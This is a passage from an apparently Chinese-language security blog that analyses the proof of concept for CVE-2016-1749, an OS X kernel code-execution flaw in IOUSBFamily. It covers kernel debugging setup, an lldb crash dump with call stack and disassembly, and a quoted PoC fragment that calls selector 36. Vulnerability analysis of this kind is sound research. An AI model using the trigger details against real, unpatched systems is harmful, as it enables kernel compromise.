    <![CDATA[<h1 id="0x00_版本小结">0x00 版本小结</h1><p>在<code>10.11.4</code>版本开始着手研究<code>OS X</code>系统安全方面的知识，上周苹果发布了<code>10.11.5</code>版本，<code>10.11.4</cod]]>
    </summary>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1749内核代码执行POC分析]]></title>
    <link href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/29/CVE-2016-1749内核代码执行POC分析/</id>
    <published>2016-04-29T16:43:50.000Z</published>
    <updated>2016-04-29T20:37:51.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><code>OS X</code>系统的10.11.4的系统补丁中修复了一个在内核中可以导致代码执行的漏洞，漏洞形成的原因是缺少了必要的边界值检测。</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">最初的漏洞报告</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=227076" target="_blank" rel="external">POC下载</a><br>本文记录了对POC的简单的调试和分析，对该漏洞有一个初步的认识，为后续的研究做好准备工作。</li>
</ul>
<a id="more"></a>
<h1 id="0x01_准备工作">0x01 准备工作</h1><p>因为这个漏洞是一个内核级的漏洞，所以需要搭建一个内核调试的环境。</p>
<h2 id="1-1_内核调试环境的搭建">1.1 内核调试环境的搭建</h2><p>内核调试环境的搭建并不复杂，但是需要一台装有<code>OS X</code>的虚拟机，只需要下载官方的<code>Kernel Debug Kit</code>，安装并按照<code>ReadMe.html</code>中的步骤操作即可。<br>一般情况下默认路径是<code>/Library/Developer/KDKs/KDK_10.11.3_15D13b.kdk/ReadMe.html</code></p>
<p><a href="https://developer.apple.com/downloads/" target="_blank" rel="external">KDK下载地址</a><br>也可以参考这篇文章<a href="http://www.freebuf.com/articles/system/90049.html" target="_blank" rel="external">OSX内核调试技巧分享</a></p>
<h2 id="1-2_利用lldb调试kernel_core_dump">1.2 利用lldb调试kernel core dump</h2><p>在默认情况下内核崩溃后会产生panic文件，记录这一次内核崩溃的最后调用栈，用来分析崩溃的原因，但是panic文件的信息量有限，而进行一次内核的动态调试步骤又比较复杂，这个时候对kernel core dump的分析是一种折中的方式。但是<code>OS X</code>系统生成的kernle core不能在本机保存需要设置一个服务器，在系统内核崩溃时会将core文件发送到服务器。</p>
<p>设置方法可以参考苹果给出的<a href="https://developer.apple.com/library/mac/technotes/tn2004/tn2118.html" target="_blank" rel="external">官方文档</a>，这里简单的叙述一下。在KDK的README文件中也有设置的步骤。</p>
<h3 id="1-2-1_设置服务器(物理机)">1.2.1 设置服务器(物理机)</h3><ul>
<li>创建core dump的文件夹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo mkdir /PanicDumps</span><br><span class="line">Password:********</span><br><span class="line">server$ sudo chown root:wheel /PanicDumps</span><br><span class="line">server$ sudo chmod <span class="number">1777</span> /PanicDumps</span><br></pre></td></tr></table></figure>
<ul>
<li><p>启用core dump服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.kdumpd.plist</span><br><span class="line">Password:********</span><br></pre></td></tr></table></figure>
</li>
<li><p>确认服务已经开启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo launchctl list | grep kdump</span><br><span class="line">Password:********</span><br><span class="line"> - <span class="number">0</span>     com.apple.kdumpd</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="1-2-2_设置客户端(虚拟机)">1.2.2 设置客户端(虚拟机)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client$ sudo nvram boot-args=<span class="string">"debug=0xd44 _panicd_ip=10.0.40.2"</span></span><br><span class="line">Password: ********</span><br></pre></td></tr></table></figure>
<p>这里的这个ip需要填物理的ip。且虚拟机可以通过该ip和物理机简历连接。</p>
<h3 id="1-2-3_使用lldb调试kernel_core">1.2.3 使用lldb调试kernel core</h3><p>当系统内核崩溃后，在物理机的<code>/PanicDumps</code>路径中会出现<code>xnu-XXX.gz</code>的文件。是通过zip压缩的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip xnu-XXX.gz</span><br></pre></td></tr></table></figure></p>
<p>通过指令解压后利用lldb查看core文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lldb -c /PanicDumps/core-xnu-<span class="number">3248.30</span>.<span class="number">4</span>-<span class="number">172.16</span>.<span class="number">9.186</span>-ca2fd00a</span><br></pre></td></tr></table></figure></p>
<p>注意需要使用sudo，否则会报错。这个时候就可以看到core dump的情况进行分析了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo lldb -c /PanicDumps/core-xnu-<span class="number">3248.30</span>.<span class="number">4</span>-<span class="number">172.16</span>.<span class="number">9.186</span>-ca2fd00a                               </span><br><span class="line">(lldb) target create --core <span class="string">"/PanicDumps/core-xnu-3248.30.4-172.16.9.186-ca2fd00a"</span></span><br><span class="line">Kernel UUID: DB8A107C-<span class="number">3</span>A4F-<span class="number">31</span>AB-<span class="number">8</span>BCE-EB77F80B1CD7</span><br><span class="line">Load Address: <span class="number">0</span>xffffff8010c00000</span><br><span class="line">warning: <span class="string">'kernel'</span> contains a debug script. To run this script <span class="keyword">in</span> this debug session:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">command</span> script import <span class="string">"/Library/Developer/KDKs/KDK_10.11.3_15D13b.kdk/System/Library/Kernels/kernel.development.dSYM/Contents/Resources/DWARF/../Python/kernel.py"</span></span><br><span class="line"></span><br><span class="line">To run all discovered debug scripts <span class="keyword">in</span> this session:</span><br><span class="line"></span><br><span class="line">    settings <span class="built_in">set</span> target.load-script-from-symbol-file <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Kernel slid <span class="number">0</span>x10a00000 <span class="keyword">in</span> memory.</span><br><span class="line">Loaded kernel file /Library/Developer/KDKs/KDK_10.<span class="number">11.3</span>_15D13b.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">Loading <span class="number">97</span> kext modules warning: Can<span class="string">'t find binary/dSYM for com.apple.kec.corecrypto (D6E082B5-93B2-3FF0-AB4B-4AA310173CE8)</span><br><span class="line">.....warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleACPIPlatform (<span class="number">3</span>BE4E926-E063-<span class="number">3</span>BBD-BE05-F6F97358C7A4)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.DiskImages (97177A33-27BD-34A9-9B42-1173BE480BCD)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleCredentialManager (E3817462-FFEE-<span class="number">38</span>AE-<span class="number">839</span>B-<span class="number">79932133</span>E7EF)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleMobileFileIntegrity (09620E73-2D73-3F62-9E5D-4B9DC2147F70)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleKeyStore (<span class="number">7</span>AF14D78-EEBE-<span class="number">3474</span>-B605-<span class="number">66</span>CC957F2FE5)</span><br><span class="line">...warning: Can<span class="string">'t find binary/dSYM for com.apple.security.sandbox (F3202072-6ED5-33BF-97B0-AD49F500ABF6)</span><br><span class="line">...warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleAPIC (<span class="number">46368557</span>-CAF1-<span class="number">3</span>FAC-AF62-A03389987023)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleSMBIOS (558EB25D-8E3F-3429-B2DC-ADAE2EF0F7C3)</span><br><span class="line">...warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleACPIButtons (<span class="number">767834</span>A6-B80F-<span class="number">36</span>ED-<span class="number">9</span>C0A-A6179A144279)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleUSBHostMergeProperties (D338A98F-2B8F-3411-BD87-BD00F620A223)</span><br><span class="line">.......warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleFileSystemDriver (<span class="number">998</span>B4AF6-<span class="number">388</span>A-<span class="number">304</span>E-<span class="number">9627</span>-EBB1237252F8)</span><br><span class="line">...warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.Intel82574L (92C2095F-4CB1-36CE-ACF9-518F4610AE68)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBXHCI (<span class="number">38</span>F68C79-<span class="number">811</span>D-<span class="number">3</span>AA2-B8D4-<span class="number">0</span>D444FF4DB4B)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBXHCIPCI (7AC984CE-8AAA-3B8D-92E3-24BE18DF3DEC)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBEHCI (FA569D7A-D439-<span class="number">32</span>EB-<span class="number">9</span>B57-<span class="number">0</span>A5D5227AC12)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBUHCI (55F5C3FB-6419-35F2-B9A3-836F696C3DBC)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBUHCIPCI (<span class="number">4</span>C589408-<span class="number">0</span>FA4-<span class="number">35</span>A0-B8BF-A65EEDFB971F)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBEHCIPCI (C2569C25-E38A-3AC0-8502-594A75E63C76)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleAHCIPort (<span class="number">20356</span>FAA-<span class="number">8898</span>-<span class="number">36</span>F8-BAAD-<span class="number">8961</span>AFC23E9B)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOAHCIBlockStorage (0A852267-0F62-363B-86D7-C2B02972EE48)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOAHCISerialATAPI (D1CA586E-<span class="number">89</span>CA-<span class="number">36</span>BE-A293-CE0BBD19367D)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleXsanScheme (00C3E9DA-99B0-3518-8B4B-38114EE146A8)</span><br><span class="line">......warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBHostCompositeDevice (<span class="number">3</span>E1A0840-<span class="number">033</span>C-<span class="number">321</span>B-B5ED-<span class="number">7</span>BEA6996B1E0)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBHub (271D9C2E-FF74-3503-958E-24C554595575)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.IOUSBHostHIDDevice (<span class="number">65</span>F7A241-C50F-<span class="number">3370</span>-<span class="number">9</span>CE8-<span class="number">54566</span>F0130DE)</span><br><span class="line">..warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleSMC (535447F9-30E0-39BA-A2B8-1A027DED5D53)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.vecLib.kext (E62681B7-BE2F-<span class="number">3</span>F89-<span class="number">8065</span>-<span class="number">91</span>C5C2876EBA)</span><br><span class="line">..warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOHDAFamily (3BF83381-C3DA-3EC4-BBE6-F2024D3EACC7)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHDAController (AC7816C9-DEF7-<span class="number">310</span>A-B059-<span class="number">5852</span>BF07A843)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOBluetoothFamily (022A55C7-EF37-3BE7-AC09-0436CDEFCE95)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOBluetoothHostControllerUSBTransport (<span class="number">67</span>B0326E-F86A-<span class="number">3</span>AEF-BE41-<span class="number">99958414</span>F094)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.vmware.kext.VMwareGfx (00FD0C5F-0A29-3656-8718-EBF372456B8E)</span><br><span class="line">....warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHV (<span class="number">8</span>E08FFC5-<span class="number">4</span>E33-<span class="number">3</span>D66-BB9B-<span class="number">2</span>EC170B650E6)</span><br><span class="line">.....warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOBluetoothSerialManager (A6A7E1A3-4063-3C42-9984-67E3BB1A0191)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOSurface (<span class="number">5</span>D984125-CEC9-<span class="number">39</span>B6-BA6E-<span class="number">6</span>C6C6004552C)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOUserEthernet (6D2530ED-C0BC-3F64-B2FC-4490CC30BC06)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.pmtelemetry (C3F2C16A-A407-<span class="number">389</span>C-AD2B-B8582742FE5E)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.IOPlatformPluginFamily (EC53D03F-6CD9-383A-8160-33E02C141EAA)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.IOPlatformPluginLegacy (<span class="number">15</span>BBAC18-<span class="number">907</span>A-<span class="number">394</span>F-BA5B-CC40E055BA13)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.ACPI_SMC_PlatformPlugin (04F77CAB-EA07-362C-B7A2-0167D56D55BC)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleSMBusController (<span class="number">04</span>C9295B-<span class="number">23</span>E8-<span class="number">388</span>B-<span class="number">8</span>BB6-<span class="number">07</span>CC377CADD2)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.DspFuncLib (F1E07A68-221D-3ED3-A2BA-1735E0582F3F)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHDA (<span class="number">344</span>D4A99-D22C-<span class="number">3</span>E43-<span class="number">9699</span>-<span class="number">82</span>C1B7044CE2)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleHDAHardwareConfigDriver (EDCBE684-9F4F-349A-9E17-D1704C26BD84)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleOSXWatchdog (<span class="number">0</span>CE80268-ACDD-<span class="number">3</span>FCC-<span class="number">8370</span>-<span class="number">8</span>A041468F898)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.vmware.kext.vmmemctl (C2161D7F-F967-3406-A377-CD7D11EDE95A)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.vmware.kext.vmhgfs (<span class="number">22192699</span>-<span class="number">95</span>BC-<span class="number">3</span>ACC-<span class="number">96</span>B1-<span class="number">023</span>E6C6073AA)</span><br><span class="line">.. done.</span><br><span class="line">Core file <span class="string">'/PanicDumps/core-xnu-3248.30.4-172.16.9.186-ca2fd00a'</span> (x86_64) was loaded.</span><br><span class="line">(lldb) bt</span><br><span class="line">IOUSBFamily was compiled with optimization - stepping may behave oddly; variables may not be available.</span><br><span class="line">* thread <span class="comment">#1: tid = 0x0000, 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181, stop reason = signal SIGSTOP</span></span><br><span class="line">  * frame <span class="comment">#0: 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181 [opt]</span></span><br><span class="line">    frame <span class="comment">#1: 0xffffff7f91b01197 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=&lt;unavailable&gt;, pipeRef=&lt;unavailable&gt;, streamID=4042322160) + 305 at IOUSBInterfaceUserClient.cpp:3656 [opt]</span></span><br><span class="line">    frame <span class="comment">#2: 0xffffff7f91afbcf9 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=&lt;unavailable&gt;, reference=&lt;unavailable&gt;, arguments=&lt;unavailable&gt;) + 241 at IOUSBInterfaceUserClient.cpp:3636 [opt]</span></span><br><span class="line">    frame <span class="comment">#3: 0xffffff80112b9c17 kernel.development`::is_io_connect_method(connection=0xffffff801a719c00, selector=36, scalar_input=&lt;unavailable&gt;, scalar_inputCnt=&lt;unavailable&gt;, inband_input=&lt;unavailable&gt;, inband_inputCnt=0, ool_input=&lt;unavailable&gt;, ool_input_size=&lt;unavailable&gt;, inband_output=&lt;unavailable&gt;, inband_outputCnt=&lt;unavailable&gt;, scalar_output=&lt;unavailable&gt;, scalar_outputCnt=&lt;unavailable&gt;, ool_output=&lt;unavailable&gt;, ool_output_size=&lt;unavailable&gt;) + 487 at IOUserClient.cpp:3720 [opt]</span></span><br><span class="line">    frame <span class="comment">#4: 0xffffff8010d5cfc0 kernel.development`_Xio_connect_method(InHeadP=&lt;unavailable&gt;, OutHeadP=0xffffff80195c55d0) + 384 at device_server.c:8255 [opt]</span></span><br><span class="line">    frame <span class="comment">#5: 0xffffff8010c88ee3 kernel.development`ipc_kobject_server(request=0xffffff801c7f3be0) + 259 at ipc_kobject.c:340 [opt]</span></span><br><span class="line">    frame <span class="comment">#6: 0xffffff8010c64e13 kernel.development`ipc_kmsg_send(kmsg=&lt;unavailable&gt;, option=&lt;unavailable&gt;, send_timeout=0) + 195 at ipc_kmsg.c:1441 [opt]</span></span><br><span class="line">    frame <span class="comment">#7: 0xffffff8010c7b435 kernel.development`mach_msg_overwrite_trap(args=&lt;unavailable&gt;) + 197 at mach_msg.c:470 [opt]</span></span><br><span class="line">    frame <span class="comment">#8: 0xffffff8010d83850 kernel.development`mach_call_munger64(state=0xffffff801b6471e0) + 480 at bsd_i386.c:560 [opt]</span></span><br><span class="line">    frame <span class="comment">#9: 0xffffff8010db9516 kernel.development`hndl_mach_scall64 + 22</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure></p>
<p>可以清楚的看到系统崩溃时的调用栈了。这个栈就是POC程序在虚拟机中执行后返回的结果。</p>
<h1 id="0x02_POC崩溃现场分析">0x02 POC崩溃现场分析</h1><p>通过对POC执行后崩溃的现场，可以得知具体的崩溃原因，已经函数的调用顺序，这样在做动态分析和静态分析的时候才能有的放矢。</p>
<h2 id="2-1_调用栈分析">2.1 调用栈分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* frame <span class="comment">#0: 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181 [opt]</span></span><br><span class="line">  frame <span class="comment">#1: 0xffffff7f91b01197 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=&lt;unavailable&gt;, pipeRef=&lt;unavailable&gt;, streamID=4042322160) + 305 at IOUSBInterfaceUserClient.cpp:3656 [opt]</span></span><br><span class="line">  frame <span class="comment">#2: 0xffffff7f91afbcf9 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=&lt;unavailable&gt;, reference=&lt;unavailable&gt;, arguments=&lt;unavailable&gt;) + 241 at IOUSBInterfaceUserClient.cpp:3636 [opt]</span></span><br><span class="line">  frame <span class="comment">#3: 0xffffff80112b9c17 kernel.development`::is_io_connect_method(connection=0xffffff801a719c00, selector=36, scalar_input=&lt;unavailable&gt;, scalar_inputCnt=&lt;unavailable&gt;, inband_input=&lt;unavailable&gt;, inband_inputCnt=0, ool_input=&lt;unavailable&gt;, ool_input_size=&lt;unavailable&gt;, inband_output=&lt;unavailable&gt;, inband_outputCnt=&lt;unavailable&gt;, scalar_output=&lt;unavailable&gt;, scalar_outputCnt=&lt;unavailable&gt;, ool_output=&lt;unavailable&gt;, ool_output_size=&lt;unavailable&gt;) + 487 at IOUserClient.cpp:3720 [opt]</span></span><br><span class="line">  frame <span class="comment">#4: 0xffffff8010d5cfc0 kernel.development`_Xio_connect_method(InHeadP=&lt;unavailable&gt;, OutHeadP=0xffffff80195c55d0) + 384 at device_server.c:8255 [opt]</span></span><br><span class="line">  frame <span class="comment">#5: 0xffffff8010c88ee3 kernel.development`ipc_kobject_server(request=0xffffff801c7f3be0) + 259 at ipc_kobject.c:340 [opt]</span></span><br><span class="line">  frame <span class="comment">#6: 0xffffff8010c64e13 kernel.development`ipc_kmsg_send(kmsg=&lt;unavailable&gt;, option=&lt;unavailable&gt;, send_timeout=0) + 195 at ipc_kmsg.c:1441 [opt]</span></span><br><span class="line">  frame <span class="comment">#7: 0xffffff8010c7b435 kernel.development`mach_msg_overwrite_trap(args=&lt;unavailable&gt;) + 197 at mach_msg.c:470 [opt]</span></span><br><span class="line">  frame <span class="comment">#8: 0xffffff8010d83850 kernel.development`mach_call_munger64(state=0xffffff801b6471e0) + 480 at bsd_i386.c:560 [opt]</span></span><br><span class="line">  frame <span class="comment">#9: 0xffffff8010db9516 kernel.development`hndl_mach_scall64 + 22</span></span><br></pre></td></tr></table></figure>
<p>结合<code>frame #3</code>的信息，以及poc中的相关代码段<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">  err = IOConnectCallMethod(</span><br><span class="line">   conn,</span><br><span class="line">   <span class="number">36</span>,</span><br><span class="line">   inputScalar,</span><br><span class="line">   inputScalarCnt,</span><br><span class="line">   inputStruct,</span><br><span class="line">   inputStructCnt,</span><br><span class="line">   outputScalar,</span><br><span class="line">   &amp;outputScalarCnt,</span><br><span class="line">   outputStruct,</span><br><span class="line">   &amp;outputStructCnt); </span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>是在应用层程序调用IOUSBFamily的36号方法，<code>_AbortStreamsPipe</code>时触发的漏洞。</li>
<li><code>_AbortStreamsPipe</code>又调用了<code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数。</li>
<li><code>IOUSBInterfaceUserClient::AbortStreamsPipe</code>函数最后调用了<code>AppleUSBPipe::Abort</code>并触发了函数的崩溃。</li>
</ul>
<h2 id="2-2_崩溃原因">2.2 崩溃原因</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  	<span class="number">0</span>xffffff7f91b1155f &lt;+<span class="number">119</span>&gt;: callq  <span class="number">0</span>xffffff80112ecc50        ; kprintf at pe_kprintf.c:<span class="number">105</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b11564 &lt;+<span class="number">124</span>&gt;: testl  %r14d, %r14d</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11567 &lt;+<span class="number">127</span>&gt;: je     <span class="number">0</span>xffffff7f91b115a8        ; &lt;+<span class="number">192</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b11569 &lt;+<span class="number">129</span>&gt;: movl   %r14d, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1156c &lt;+<span class="number">132</span>&gt;: movq   <span class="number">0</span>x88(%rbx), %rcx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11573 &lt;+<span class="number">139</span>&gt;: movq   (%rcx,%rax,<span class="number">8</span>), %rdi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11577 &lt;+<span class="number">143</span>&gt;: movl   <span class="variable">$0xe00002f0</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1157c &lt;+<span class="number">148</span>&gt;: testq  %rdi, %rdi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1157f &lt;+<span class="number">151</span>&gt;: je     <span class="number">0</span>xffffff7f91b115c9        ; &lt;+<span class="number">225</span>&gt; at AppleUSBPipe.cpp:<span class="number">1187</span></span><br><span class="line">-&gt;  <span class="number">0</span>xffffff7f91b11581 &lt;+<span class="number">153</span>&gt;: movq   (%rdi), %rax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11584 &lt;+<span class="number">156</span>&gt;: xorl   %esi, %esi</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11586 &lt;+<span class="number">158</span>&gt;: movl   <span class="variable">$0xe00002eb</span>, %edx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1158b &lt;+<span class="number">163</span>&gt;: xorl   %ecx, %ecx</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1158d &lt;+<span class="number">165</span>&gt;: callq  *<span class="number">0</span>x178(%rax)</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11593 &lt;+<span class="number">171</span>&gt;: cmpl   <span class="variable">$0xe00002d6</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b11598 &lt;+<span class="number">176</span>&gt;: je     <span class="number">0</span>xffffff7f91b115b6        ; &lt;+<span class="number">206</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b1159a &lt;+<span class="number">178</span>&gt;: cmpl   <span class="variable">$0xe0005001</span>, %eax</span><br><span class="line">    <span class="number">0</span>xffffff7f91b1159f &lt;+<span class="number">183</span>&gt;: jne    <span class="number">0</span>xffffff7f91b115bd        ; &lt;+<span class="number">213</span>&gt; at AppleUSBPipe.cpp:<span class="number">1175</span></span><br><span class="line">    <span class="number">0</span>xffffff7f91b115a1 &lt;+<span class="number">185</span>&gt;: movl   <span class="variable">$0xe000405d</span>, %eax</span><br></pre></td></tr></table></figure>
